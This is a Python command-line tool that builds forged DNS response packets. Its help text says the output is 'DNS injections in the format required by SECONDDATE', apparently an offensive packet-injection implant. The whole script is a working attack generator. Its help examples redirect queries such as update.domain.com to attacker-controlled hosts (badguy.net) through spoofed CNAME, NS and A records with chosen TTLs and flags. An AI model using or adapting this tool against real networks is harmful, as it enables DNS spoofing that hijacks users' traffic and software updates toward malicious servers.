#!/usr/bin/env python

from optparse import OptionParser, Option, OptionValueError
import copy
import re
import socket
import struct
import sys

from optparse import IndentedHelpFormatter
import textwrap


Flags = {
    'AA' : 10,
    'TC' : 9,
    'RA' : 7,
}


Qtypes = {
    'A' : 1,
    'NS' : 2,
    'CNAME' : 5,
    'PTR' : 12,
}


class IndentedHelpFormatterWithNL(IndentedHelpFormatter):

    def format_description(self, description):
        if not description:
            return ''
        desc_width = self.width - self.current_indent
        indent = ' ' * self.current_indent
        bits = description.split('\n')
        formatted_bits = [
            textwrap.fill(
                bit,
                desc_width,
                initial_indent=indent,
                subsequent_indent=indent)
            for bit in bits]
        return '\n'.join(formatted_bits) + '\n'


class DNSRecord:

    def __init__(self, name, type, ttl, data):
        if len(name) == 0 or len(name) > 253:
            raise ValueError
        if type == 'PTR' and not self.is_valid_ip(name) or \
           type != 'PTR' and not self.is_valid_name(name):
            raise ValueError

        type = type.upper()
        if not type in Qtypes.keys():
            raise ValueError

        ttl = int(ttl)
        if 0 > ttl:
            raise ValueError

        if len(data) == 0 or len(data) > 253:
            raise ValueError
        if type == 'A' and not self.is_valid_ip(data) or \
           type != 'A' and not self.is_valid_name(data):
            raise ValueError

        self.name = name
        self.type = type
        self.ttl = ttl
        self.data = data

    def is_valid_name(self, name):
        result = True
        for s in name.split('.'):
            if len(s) > 63:
                result = False
                break
        return result

    def is_valid_ip(self, addr):
        result = True
        if len(addr.split('.')) != 4:
            result = False
        for s in addr.split('.'):
            if len(s) > 3:
                result = False
                break
        try:
            socket.inet_aton(addr)
        except socket.error:
            result = False
        return result


def check_DNSRecord(option, opt, value):
    try:
        (name, type, ttl, data) = value.split(',')
        return DNSRecord(name, type, ttl, data)
    except ValueError:
        raise OptionValueError(
            '%s %r invalid; expected: Name,Type,TTL,Data' % (opt, value))


class ExtendedOption(Option):
    TYPES = Option.TYPES + ('DNSRecord',)
    TYPE_CHECKER = copy.copy(Option.TYPE_CHECKER)
    TYPE_CHECKER['DNSRecord'] = check_DNSRecord


def parse_arguments(parser):
    parser.set_defaults(flags=[])
    parser.set_defaults(question='')
    parser.set_defaults(compression=False)
    parser.set_defaults(authorities=[])
    parser.set_defaults(additionals=[])

    parser.add_option(
        '-o', '--outfile',
        action='store', type='string', dest='outfile',
        help='Output file name (optional). By default the resulting data is written to stdout.')
    parser.add_option(
        '-f', '--flag',
        action='append', type='choice', choices=Flags.keys(), dest='flags',
        help='Header flags to set: %s (optional).' % Flags.keys())
    parser.add_option(
        '-a', '--answer',
        action='append', type='DNSRecord', dest='answers',
        help='DNS answer section resource record (at least one required). Format: Name,Type,TTL,Data')
    parser.add_option(
        '-u', '--authority',
        action='append', type='DNSRecord', dest='authorities',
        help='DNS authority section resource record (optional). Format: Name,Type,TTL,Data')
    parser.add_option(
        '-d', '--additional',
        action='append', type='DNSRecord', dest='additionals',
        help='DNS additional section resource record (optional). Format: Name,Type,TTL,Data')
    parser.add_option('-q', '--question',
        action='store', type='string', dest='question',
        help='Name field from the DNS question section (required when compression is enabled).')
    parser.add_option(
        '-c', '--compress',
        action='store_true', dest='compression',
        help='Compress the given names and data using standard DNS compression.')
    return parser.parse_args()


class DNSCompressionData:

    def __init__(self, offset, question):
        self.data = [(offset, question)]

    def add(self, offset, name):
        self.data.append(
            (offset + self.data[0][0]+len(self.data[0][1]) + 5, name))

    def find(self, name):
        for d in self.data:
            if d[1].endswith(name):
                return d[0] + (len(d[1]) - len(name))
        return -1


class DNSInjection:

    def __init__(self, flags, question='', compression=False):
        self.sections = ''
        self.flags = flags
        self.acount = 0
        self.ucount = 0
        self.dcount = 0
        self.compression = compression
        self.compressor = DNSCompressionData(12, '.' + question)

    def add_section(self, section, record):
        if section == 'a':
            self.acount += 1
        elif section == 'u':
            self.ucount += 1
        elif section == 'd':
            self.dcount += 1
        else:
            return

        if record.type == 'PTR':
            fixed = ''
            for s in reversed(record.name.split('.')):
                fixed += s + '.'
            record.name = fixed + 'in-addr.arpa'

        if self.compression == True and not 'OFFSET' in record.name:
            record.name = self.compress(record.name)

        name = self.encode_name(record.name)
        type = Qtypes[record.type]
        ttl = record.ttl

        self.sections += struct.pack('>%dsHHL' % (len(name)),
            name, type, 1, ttl)

        if record.type == 'A':
            data = self.encode_address(record.data)
        else:
            if self.compression == True and not 'OFFSET' in record.data:
                record.data = self.compress(record.data, is_data=True)
            data = self.encode_name(record.data)

        self.sections += struct.pack('>H%ds' % (len(data)),
            len(data), data)

    def encode_address(self, address):
        packed = ''
        for section in address.split('.'):
            packed += struct.pack('>B',
                int(section))
        return packed

    def encode_name(self, name):
        packed = ''
        for section in name.split('.'):
            pointer = re.match('^(.*)OFFSET:(\d+)$', section)
            if pointer:
                if len(pointer.groups()[0]) != 0:
                    packed += struct.pack('>B%ds' % len(pointer.groups()[0]),
                        len(pointer.groups()[0]), pointer.groups()[0])
                return struct.pack('>%dsH' % len(packed),
                    packed, 49152 + int(pointer.groups()[1]))
            packed += struct.pack('>B%ds' % len(section),
                len(section), section)
        return struct.pack('>%dsB' % len(packed),
            packed, 0)

    def compress(self, name, is_data=False):
        s = '.' + name
        t = ''
        compressed = name
        while True:
            offset = self.compressor.find(s)
            if offset != -1:
                compressed = t + 'OFFSET:' + str(offset)
                break
            i = s.find('.', 1)
            if i == -1:
                break
            t = t + s[:i]
            s = s[i:]
        if is_data == False:
            self.compressor.add(len(self.sections), '.' + name)
        else:
            self.compressor.add(len(self.sections) + 2, '.' + name)
        if compressed.startswith('.'):
            compressed = compressed[1:]
        return compressed

    def add_answer(self, record):
        self.add_section('a', record)

    def add_authority(self, record):
        self.add_section('u', record)

    def add_additional(self, record):
        self.add_section('d', record)

    def finish(self):
        bits = 0
        for flag in self.flags:
            bits |= 1 << Flags[flag]
        header = struct.pack('>HHHHHH',
            0, bits, 0, self.acount, self.ucount, self.dcount)
        return header + self.sections


def main():
    description = """
Generates DNS injections in the format required by SECONDDATE. Multiple
answer, authority, and additional resource records can be specified and
will be used in the given order.

Each resource record should take the form:

    Name,Type,TTL,Data

    Name:   A hostname: 'host.network.com', a decimal numeric offset within
            the final packet 'OFFSET:12' (a pointer to the beginning of the
            query name), or a combination: 'otherOFFSET:17' (a pointer to
            .network.com if the query name is [any 4 characters].network.com.

            If the record type is 'PTR' then only the IP address is
            necessary. Given this record type, names of the form 'w.x.y.z'
            will be automatically translated to 'z.y.x.w.in-addr.arpa'.

    Type:   Abbreviation of the DNS record type. Supported types
                A, NS, CNAME, and PTR

    TTL:    The record's time to live in decimal seconds. This is the time
            that the record should remain valid if cached.

    Data:   A domain name or an IP address, chosen appropriately for the
            given record type. Domain name types: NS, CNAME, PTR; IP
            address types: A.

The flags option can be specified multiple times and allows setting
server controlled flag values:

    AA:     The answer as authoritative.
    TC:     The answer has been truncated.
    RA:     Recursion is available.

Although the question portion of the DNS packet is not necessary, if it is
known during rule creation the strings in the packet can be optimized by
using DNS compression. The question (or at an absolute mimimum an arbitrary
string of the same length as the real question) must be provided in order to
enable the compression.

Examples

    Simple, single answer of 192.168.1.1 to any DNS query that should
    not be cached due to a 0 second TTL:

    ./create_dns_injection.py -a OFFSET:12,A,0,192.168.1.1

    Complex, multiple answer reply using CNAMEs with a 30 minute TTL:

    ./create_dns_injection.py -a OFFSET:12,CNAME,1800,www.badguy.net \\
        -a www.badguy.net,CNAME,1800,host.badguy.net \\
        -a host.badguy.net,A,1800,192.168.1.1

    Similar to the previous example, but adds authority and additional
    sections, sets to the initial query, and enables compression:

    ./create_dns_injection.py -a update.domain.com,CNAME,1800,www.badguy.net \\
        -a www.badguy.net,CNAME,1800,host.badguy.net \\
        -a host.badguy.net,A,1800,192.168.1.1 \\
        -u badguy.net,NS,1800,ns.badguy.net \\
        -d ns.badguy.net,A,1800,192.168.1.1 \\
        -q update.domain.com \\
        -c
"""

    parser = OptionParser(
        option_class=ExtendedOption,
        usage="%prog -a | --answer name,type,ttl,data [ ... options ... ]",
        version="%prog 1.1",
        description=description,
        formatter=IndentedHelpFormatterWithNL())

    (options, args) = parse_arguments(parser)

    # need at least one answer
    if not options.answers:
        parser.error("at least one -a or --answer required")

    # need to know the length of the question to compress
    if True == options.compression and '' == options.question:
        parser.error("-q or --question required for compression")

    injection = DNSInjection(
        options.flags,
        question=options.question,
        compression=options.compression)

    for r in options.answers:
        injection.add_answer(r)
    for r in options.authorities:
        injection.add_authority(r)
    for r in options.additionals:
        injection.add_additional(r)

    output = injection.finish()

    if options.outfile:
        file = open(options.outfile, 'wb')
        file.write(output)
        file.close()
    else:
        sys.stdout.write(output)


if __name__ == '__main__':
    main()

